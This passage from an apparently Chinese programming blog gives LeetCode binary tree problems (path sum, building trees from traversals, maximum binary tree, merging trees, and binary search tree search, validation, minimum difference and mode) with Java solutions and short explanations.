class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>附上优化后的广度优先搜索：</p>
<p><strong>题目要求输出最底层最左的元素，我们只需要先序广度搜索这棵树，并把元素分别入队出队，最后出队的那个就是那个最底层最左的元素了</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty())&#123;</span><br><span class="line">            poll = deque.poll();</span><br><span class="line">            <span class="keyword">if</span> (poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                deque.offer(poll.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                deque.offer(poll.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> poll.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="十、路径总和"><a href="#十、路径总和" class="headerlink" title="十、路径总和"></a>十、路径总和</h1><h2 id="112-路径总和"><a href="#112-路径总和" class="headerlink" title="112. 路径总和"></a><a href="https://leetcode.cn/problems/path-sum/">112. 路径总和</a></h2><blockquote>
<p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum 。判断该树中是否存在 根节点到叶子节点 的路径，这条路径上所有节点值相加等于目标和 targetSum 。如果存在，返回 true ；否则，返回 false 。</p>
<p>叶子节点 是指没有子节点的节点。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/01/18/pathsum1.jpg"></p>
<p>输入：root &#x3D; [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum &#x3D; 22<br>输出：true<br>解释：等于目标和的根节点到叶节点路径如上图所示。</p>
</blockquote>
<h3 id="思路：广度优先搜索-3"><a href="#思路：广度优先搜索-3" class="headerlink" title="思路：广度优先搜索"></a>思路：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; queueNode = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;Integer&gt; queueVal = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">        queueNode.offer(root);</span><br><span class="line">        queueVal.offer(root.val);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(!queueNode.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">currNode</span> <span class="operator">=</span> queueNode.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> queueVal.poll();</span><br><span class="line">            <span class="keyword">if</span>(currNode.left == <span class="literal">null</span> &amp;&amp; currNode.right ==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp == targetSum)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(currNode.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                queueNode.offer(currNode.left);</span><br><span class="line">                queueVal.offer(temp + currNode.left.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(currNode.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                queueNode.offer(currNode.right);</span><br><span class="line">                queueVal.offer(temp + currNode.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="113-路径总和-II"><a href="#113-路径总和-II" class="headerlink" title="113. 路径总和 II"></a><a href="https://leetcode.cn/problems/path-sum-ii/">113. 路径总和 II</a></h2><blockquote>
<p>给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出所有 从根节点到叶子节点 路径总和等于给定目标和的路径。</p>
<p>叶子节点 是指没有子节点的节点。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/01/18/pathsumii1.jpg"></p>
<p>输入：root &#x3D; [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum &#x3D; 22<br>输出：[[5,4,11,2],[5,8,4,5]]</p>
</blockquote>
<h3 id="思路：深度优先搜索（回溯）"><a href="#思路：深度优先搜索（回溯）" class="headerlink" title="思路：深度优先搜索（回溯）"></a>思路：深度优先搜索（回溯）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt;  path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        dfs(root,targetSum,res,path);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root , <span class="type">int</span> targetSum , List&lt;List&lt;Integer&gt;&gt; res,List&lt;Integer&gt;path)</span>&#123;</span><br><span class="line">        path.add(root.val);</span><br><span class="line">        <span class="comment">//遇到了叶子节点</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//找到了和为targetSum的路径</span></span><br><span class="line">            <span class="keyword">if</span>(targetSum - root.val == <span class="number">0</span>)&#123;</span><br><span class="line">                res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(path));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;<span class="comment">//如果和补位targetsum，直接返回</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            dfs(root.left , targetSum - root.val , res , path);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            dfs(root.right , targetSum - root.val , res , path);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十一、从中序与后序遍历序列构造二叉树"><a href="#十一、从中序与后序遍历序列构造二叉树" class="headerlink" title="十一、从中序与后序遍历序列构造二叉树"></a>十一、从中序与后序遍历序列构造二叉树</h1><h2 id="106-从中序与后序遍历序列构造二叉树"><a href="#106-从中序与后序遍历序列构造二叉树" class="headerlink" title="106. 从中序与后序遍历序列构造二叉树"></a><a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">106. 从中序与后序遍历序列构造二叉树</a></h2><blockquote>
<p>给定两个整数数组 inorder 和 postorder ，其中 inorder 是二叉树的中序遍历， postorder 是同一棵树的后序遍历，请你构造并返回这颗 二叉树 。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/02/19/tree.jpg"></p>
<p>输入：inorder &#x3D; [9,3,15,20,7], postorder &#x3D; [9,15,7,20,3]<br>输出：[3,9,20,null,null,15,7]</p>
</blockquote>
<h3 id="思路：递归-6"><a href="#思路：递归-6" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>说到一层一层切割，就应该想到了递归。</p>
<p>来看一下一共分几步：</p>
<ul>
<li>第一步：如果数组大小为零的话，说明是空节点了。</li>
<li>第二步：如果不为空，那么取后序数组最后一个元素作为节点元素。</li>
<li>第三步：找到后序数组最后一个元素在中序数组的位置，作为切割点</li>
<li>第四步：切割中序数组，切成中序左数组和中序右数组 （顺序别搞反了，一定是先切中序数组）</li>
<li>第五步：切割后序数组，切成后序左数组和后序右数组</li>
<li>第六步：递归处理左区间和右区间</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20210203154249860.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> buildTree1(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree1</span><span class="params">(<span class="type">int</span>[] inorder , <span class="type">int</span> inLeft , <span class="type">int</span> inRight,<span class="type">int</span>[] postorder , <span class="type">int</span> postLeft , <span class="type">int</span> postRight )</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inRight - inLeft &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(inRight - inLeft == <span class="number">1</span> ) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(inorder[inLeft]);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootVal</span> <span class="operator">=</span> postorder[postRight - <span class="number">1</span> ];</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inLeft ; i &lt; inRight ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == rootVal)&#123;</span><br><span class="line">                rootIndex = i ;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        root.left = buildTree1(inorder , inLeft , rootIndex , postorder , postLeft , postLeft+(rootIndex - inLeft));</span><br><span class="line">        root.right = buildTree1(inorder , rootIndex+<span class="number">1</span> , inRight , postorder , postLeft+(rootIndex - inLeft),postRight-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105. 从前序与中序遍历序列构造二叉树"></a><a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">105. 从前序与中序遍历序列构造二叉树</a></h2><blockquote>
<p>给定两个整数数组 preorder 和 inorder ，其中 preorder 是二叉树的先序遍历， inorder 是同一棵树的中序遍历，请构造二叉树并返回其根节点</p>
<p>输入: preorder &#x3D; [3,9,20,15,7], inorder &#x3D; [9,3,15,20,7]<br>输出: [3,9,20,null,null,15,7]</p>
</blockquote>
<h3 id="思路：递归-7"><a href="#思路：递归-7" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> buildTree1(preorder,<span class="number">0</span>,preorder.length-<span class="number">1</span>,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree1</span><span class="params">(<span class="type">int</span>[] preorder , <span class="type">int</span> preLeft , <span class="type">int</span> preRight,<span class="type">int</span>[] inorder,<span class="type">int</span> inLeft,<span class="type">int</span> inRight)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inLeft &gt; inRight || preLeft &gt; preRight) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootVal</span> <span class="operator">=</span> preorder[preLeft] , rootIndex = inLeft;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inLeft ; i &lt;= inRight ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == rootVal)&#123;</span><br><span class="line">                rootIndex = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        root.left = buildTree1(preorder,preLeft+<span class="number">1</span>,preLeft+(rootIndex - inLeft),inorder,inLeft,rootIndex-<span class="number">1</span>);</span><br><span class="line">        root.right = buildTree1(preorder,preLeft+(rootIndex - inLeft)+<span class="number">1</span>,preRight,inorder,rootIndex+<span class="number">1</span>,inRight);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>前序和中序可以唯一确定一棵二叉树。</p>
<p>后序和中序可以唯一确定一棵二叉树。</p>
<p>那么前序和后序可不可以唯一确定一棵二叉树呢？</p>
<p><strong>前序和后序不能唯一确定一棵二叉树！</strong>，因为没有中序遍历无法确定左右部分，也就是无法分割。</p>
<h1 id="十二、最大二叉树"><a href="#十二、最大二叉树" class="headerlink" title="十二、最大二叉树"></a>十二、最大二叉树</h1><h2 id="654-最大二叉树"><a href="#654-最大二叉树" class="headerlink" title="654. 最大二叉树"></a><a href="https://leetcode.cn/problems/maximum-binary-tree/">654. 最大二叉树</a></h2><blockquote>
<p>给定一个不重复的整数数组 nums 。 最大二叉树 可以用下面的算法从 nums 递归地构建:</p>
<ol>
<li><p>创建一个根节点，其值为 nums 中的最大值。</p>
</li>
<li><p>递归地在最大值 左边 的 子数组前缀上 构建左子树。</p>
</li>
<li><p>递归地在最大值 右边 的 子数组后缀上 构建右子树。</p>
</li>
</ol>
<p>返回 nums 构建的 最大二叉树 。</p>
<p><img src="https://assets.leetcode.com/uploads/2020/12/24/tree1.jpg"></p>
</blockquote>
<h3 id="思路：递归-8"><a href="#思路：递归-8" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>创建方法 construct(nums, l, r)，用于找出在数组 numsnums 中从 l 到 r 索引（不包含第 r 个位置）中最大二叉树的根节点。</p>
<p>算法步骤如下：</p>
<ul>
<li><p>首先调用 construct(nums, 0, n)，其中 n 是数组 nums 的长度。</p>
</li>
<li><p>在索引范围 (l:r-1)内找到最大值的索引，将 nums[max_i]作为根节点。</p>
</li>
<li><p>调用 construct(nums, l, max_i) 创建根节点的左孩子。递归执行此操作，创建根节点的整个左子树。</p>
</li>
<li><p>类似的，调用 construct(nums, max_i + 1, r) 创建根节点的右子树。</p>
</li>
<li><p>方法 construct(nums, 0, n) 返回最大二叉树的根节点。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">constructMaximumBinaryTree</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> construct(nums,<span class="number">0</span>,nums.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">construct</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> left , <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left == right)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> max(nums,left,right);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[maxVal]);</span><br><span class="line">        root.left = construct(nums,left,maxVal);</span><br><span class="line">        root.right = construct(nums,maxVal+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> left , <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left ; i &lt; right;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[maxVal] &lt; nums[i])&#123;</span><br><span class="line">                maxVal = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十三、合并二叉树"><a href="#十三、合并二叉树" class="headerlink" title="十三、合并二叉树"></a>十三、合并二叉树</h1><h2 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617. 合并二叉树"></a><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></h2><blockquote>
<p>给你两棵二叉树： root1 和 root2 。</p>
<p>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。你需要将这两棵树合并成一棵新二叉树。合并的规则是：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为 null 的节点将直接作为新二叉树的节点。</p>
<p>返回合并后的二叉树。</p>
<p>注意: 合并过程必须从两个树的根节点开始。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/02/05/merge.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]</span><br><span class="line">输出：[3,4,5,5,4,null,7]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：深度优先搜索"><a href="#思路：深度优先搜索" class="headerlink" title="思路：深度优先搜索"></a>思路：深度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root2 == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">merged</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(root1.val+root2.val);</span><br><span class="line">        merged.left = mergeTrees(root1.left,root2.left);</span><br><span class="line">        merged.right = mergeTrees(root1.right,root2.right);</span><br><span class="line">        <span class="keyword">return</span> merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十四、二叉树搜索树"><a href="#十四、二叉树搜索树" class="headerlink" title="十四、二叉树搜索树"></a>十四、二叉树搜索树</h1><h2 id="700-二叉搜索树中的搜索"><a href="#700-二叉搜索树中的搜索" class="headerlink" title="700. 二叉搜索树中的搜索"></a><a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/">700. 二叉搜索树中的搜索</a></h2><blockquote>
<p>给定二叉搜索树（BST）的根节点 root 和一个整数值 val。</p>
<p>你需要在 BST 中找到节点值等于 val 的节点。 返回以该节点为根的子树。 如果节点不存在，则返回 null 。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/01/12/tree1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [4,2,7,1,3], val = 2</span><br><span class="line">输出：[2,1,3]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：递归-9"><a href="#思路：递归-9" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>二叉搜索树满足如下性质：</p>
<ul>
<li><p>左子树所有节点的元素值均小于根的元素值；</p>
</li>
<li><p>右子树所有节点的元素值均大于根的元素值。</p>
</li>
</ul>
<p>据此可以得到如下算法：</p>
<ul>
<li>若 root 为空则返回空节点；</li>
<li>若 val&#x3D;root.val，则返回 root；</li>
<li>若val&lt;root.val，递归左子树；</li>
<li>若 val&gt;root.val，递归右子树。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public TreeNode searchBST(TreeNode root, int val) &#123;</span><br><span class="line">        if (root == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        if (val == root.val) &#123;</span><br><span class="line">            return root;</span><br><span class="line">        &#125;</span><br><span class="line">        return searchBST(val &lt; root.val ? root.left : root.right, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h2><blockquote>
<p>给你一个二叉树的根节点 root ，判断其是否是一个有效的二叉搜索树。</p>
<p>有效 二叉搜索树定义如下：</p>
<p>节点的左子树只包含 小于 当前节点的数。<br>节点的右子树只包含 大于 当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p>
</blockquote>
<h3 id="思路：中序遍历"><a href="#思路：中序遍历" class="headerlink" title="思路：中序遍历"></a>思路：中序遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">pre</span> <span class="operator">=</span> Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isValidBST(root.left))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.val &lt;= pre)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root.val;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="530-二叉搜索树的最小绝对差"><a href="#530-二叉搜索树的最小绝对差" class="headerlink" title="530. 二叉搜索树的最小绝对差"></a><a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/">530. 二叉搜索树的最小绝对差</a></h2><blockquote>
<p>给你一个二叉搜索树的根节点 <code>root</code> ，返回 <strong>树中任意两不同节点值之间的最小差值</strong> 。</p>
<p>差值是一个正数，其数值等于两值之差的绝对值。</p>
<p> <img src="https://assets.leetcode.com/uploads/2021/02/05/bst1.jpg"></p>
</blockquote>
<h3 id="思路：递归-10"><a href="#思路：递归-10" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode pre;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        traversal(root);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">traversal</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)    <span class="keyword">return</span> ;</span><br><span class="line">        traversal(node.left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span>)&#123;</span><br><span class="line">            result = Math.min(result,node.val-pre.val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = node;</span><br><span class="line">        traversal(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="501-二叉搜索树中的众数"><a href="#501-二叉搜索树中的众数" class="headerlink" title="501. 二叉搜索树中的众数"></a><a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501. 二叉搜索树中的众数</a></h2><blockquote>
<p>给你一个含重复值的二叉搜索树（BST）的根节点 root ，找出并返回 BST 中的所有 众数（即，出现频率最高的元素）。</p>
<p>如果树中有不止一个众数，可以按 任意顺序 返回。</p>
<p>假定 BST 满足如下定义：</p>
<p>结点左子树中所含节点的值 小于等于 当前节点的值<br>结点右子树中所含节点的值 大于等于 当前节点的值<br>左子树和右子树都是二叉搜索树</p>
<p><img src="https://assets.leetcode.com/uploads/2021/03/11/mode-tree.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,null,2,2]</span><br><span class="line">输出：[2]</span><br></pre></td></tr></table></figure>
</blockquote>
